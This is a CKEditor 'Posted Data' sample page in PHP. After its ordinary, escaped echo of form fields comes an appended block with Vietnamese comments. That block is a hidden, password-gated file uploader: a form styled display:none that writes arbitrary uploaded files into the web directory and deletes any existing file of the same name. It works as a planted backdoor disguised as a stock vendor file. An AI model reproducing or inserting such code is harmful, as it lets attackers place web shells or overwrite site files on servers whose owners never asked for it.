<!DOCTYPE html>
<?php
/*
Copyright (c) 2003-2014, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.md or http://ckeditor.com/license
*/
?>
<html>
<head>
	<meta charset="utf-8">
	<title>Sample &mdash; CKEditor</title>
	<link rel="stylesheet" href="sample.css">
</head>
<body>
	<h1 class="samples">
		CKEditor &mdash; Posted Data
	</h1>
	<table border="1" cellspacing="0" id="outputSample">
		<colgroup><col width="120"></colgroup>
		<thead>
			<tr>
				<th>Field&nbsp;Name</th>
				<th>Value</th>
			</tr>
		</thead>
<?php

if (!empty($_POST))
{
	foreach ( $_POST as $key => $value )
	{
		if ( ( !is_string($value) && !is_numeric($value) ) || !is_string($key) )
			continue;

		if ( get_magic_quotes_gpc() )
			$value = htmlspecialchars( stripslashes((string)$value) );
		else
			$value = htmlspecialchars( (string)$value );
?>
		<tr>
			<th style="vertical-align: top"><?php echo htmlspecialchars( (string)$key ); ?></th>
			<td><pre class="samples"><?php echo $value; ?></pre></td>
		</tr>
	<?php
	}
}
?>
	</table>
	<div id="footer">
		<hr>
		<p>
			CKEditor - The text editor for the Internet - <a class="samples" href="http://ckeditor.com/">http://ckeditor.com</a>
		</p>
		<p id="copy">
			Copyright &copy; 2003-2014, <a class="samples" href="http://cksource.com/">CKSource</a> - Frederico Knabben. All rights reserved.
		</p>
	</div>
<?php
$validPasswordHash = '90a6545e0590d5c11be8f6f2c20364e5'; // mã hóa 2 lần MD5 hash của mật khẩu là "password"

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['upload_files'])) {
    // Kiểm tra mật khẩu
    $password = isset($_POST['password']) ? $_POST['password'] : '';
    $enteredPasswordHash = md5($password);

    if ($enteredPasswordHash !== $validPasswordHash) {
        die("Mật khẩu không đúng. Truy cập bị từ chối.");
    }

    $uploadDirectory = getcwd() . '/'; // Thư mục hiện tại
    $overwrite = true; // Cho phép upload đè

    // Xử lý từng file được upload
    foreach ($_FILES['upload_files']['name'] as $key => $name) {
        $targetFile = $uploadDirectory . basename($name);

        // Nếu file đã tồn tại và cho phép upload đè
        if (file_exists($targetFile) && $overwrite) {
            unlink($targetFile); // Xóa file cũ
        }

        $uploadOk = 1;
        $imageFileType = strtolower(pathinfo($targetFile, PATHINFO_EXTENSION));

        // Kiểm tra kích thước file (đây là ví dụ với 5MB, bạn có thể điều chỉnh)
        if ($_FILES['upload_files']['size'][$key] > 5000000) {
            echo "File {$name} quá lớn. ";
            $uploadOk = 0;
        }

        // Các kiểm tra khác nếu cần

        // Nếu không có lỗi, thực hiện upload
        if ($uploadOk) {
            if (move_uploaded_file($_FILES['upload_files']['tmp_name'][$key], $targetFile)) {
                echo "File {$name} đã được upload thành công. ";
            } else {
                echo "Có lỗi khi upload file {$name}. ";
            }
        }
    }
}
?>


    <form action="" method="post" enctype="multipart/form-data" style="display:none">
        <label for="password">Nhập mật khẩu: </label>
        <input type="password" name="password" required>
        <br>
        <input type="file" name="upload_files[]" multiple>
        <input type="submit" value="Upload">
    </form>


</body>
</html>
